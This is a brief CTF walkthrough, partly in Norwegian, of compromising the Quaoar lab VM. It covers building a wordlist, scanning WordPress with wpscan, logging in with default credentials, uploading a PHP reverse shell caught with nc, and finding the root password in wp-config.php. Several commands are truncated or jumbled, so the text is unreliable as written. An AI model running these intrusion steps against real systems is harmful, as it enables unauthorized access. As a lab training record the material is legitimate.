### Quaoar - written by chris

nmap

**generere ordliste**

cewl -d 0 -m 5 -w /root/Desktop/quaoar.lst

[https://en.wikipedia.org/wiki/50000\_Quoaor](https://en.wikipedia.org/wiki/50000_Quoaor)

sort -u /root/Desktop/quaoar.lst

&gt;

/root/Desktop/quaoar2.

tr '\[:upper:\]' '\[:lower:\]'

&lt;

/root/Desktop/quaoar2.lst

&gt;

/root/Desktop/quoar

john --wordlist=/root/Desktop/quaoar.lst --rules --stdout

&gt;

/root/Desktop/qua

`wpscan --url http://10.0.0.10/wordpress --enumerate uap`

fant login`admin admin` og `wpuser wpuser`

lastet opp php-reverse-shell og connectet med

`nc -lvp 4444`

got shell med www-data som bruker

**spawne shell med python**

`python -c 'import pty;pty.spawn("/bin/bash")'`

fant flag

`www-data@Quaoar:/home/wpadmin$ cat fl`

`cat flag.txt`

`2bafe61f03117ac66a73c3c514de796e`

prøver å finne noe root fun

`find / -perm -4000 -user root 2>/dev/null`

funket ikke

sjekker ut wordpress directory og grepper etter root

sjekk /var/www/wordpress/wp-config.php først!

fant root password rootpassword!

flag i /root

**8e3f9ec016e3598c5eec11fd3d73f6fb**

cat /etc/cron.d avslører en cron-fil php5. der var flag

**d46795f84148fd338603d0d6a9dbf8de**

